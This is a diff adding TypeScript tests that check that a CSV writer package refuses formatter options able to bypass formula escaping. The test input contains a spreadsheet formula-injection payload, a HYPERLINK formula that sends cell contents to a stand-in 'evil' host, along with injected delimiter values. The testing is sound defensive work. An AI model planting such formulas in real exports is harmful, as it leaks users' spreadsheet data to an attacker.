@@ -142,3 +142,34 @@ describe('@xlvane/compat: formatter options that a standard reader splits differ
     for (const f of rows[0]!) expect(FORMULA.test(f)).toBe(false);
   });
 });
+
+describe('@xlvane/compat: more formatter options (independent review of the patch, D-J01)', () => {
+  const write = async (rows: string[][], formatterOptions: Record<string, unknown>): Promise<string> => {
+    const wb = new ExcelJS.Workbook();
+    const ws = wb.addWorksheet('S');
+    for (const r of rows) ws.addRow(r);
+    return new TextDecoder().decode((await wb.csv.writeBuffer({ formatterOptions } as never)) as Uint8Array);
+  };
+  const refused = [
+    ['quote', { quote: "'" }],
+    ['quote', { quote: '\n' }],
+    ['quote', { quote: '=' }],
+    ['quote', { quote: '-', quoteColumns: true }],
+    ['rowDelimiter', { rowDelimiter: '\n=' }],
+    ['rowDelimiter', { rowDelimiter: ';' }],
+    ['delimiter', { delimiter: ',\n=1+1,' }],
+    ['delimiter', { delimiter: '\t=' }],
+    ['delimiter', { delimiter: ',\u0000' }],
+  ] as const;
+  for (const [option, fo] of refused) {
+    it(`refuses ${JSON.stringify(fo)} while formulas are escaped`, async () => {
+      await expect(write([['a\n=HYPERLINK("http://evil/?"&A1)\n', 'b'], ['c,=SUM(1)\n', 'd']], fo)).rejects.toMatchObject({ code: 'XLV_E_INVALID_OPTION', details: { option } });
+    });
+  }
+
+  it('keeps the usual options: tab, ";" and "|" delimiters, CRLF or CR rows, quote false', async () => {
+    for (const fo of [{ delimiter: '\t' }, { delimiter: ';' }, { delimiter: '|' }, { rowDelimiter: '\r\n' }, { rowDelimiter: '\r' }, { quote: false }, { quote: '"', escape: '"' }]) {
+      await expect(write([['a', 'b']], fo)).resolves.toContain('a');
+    }
+  });
+});
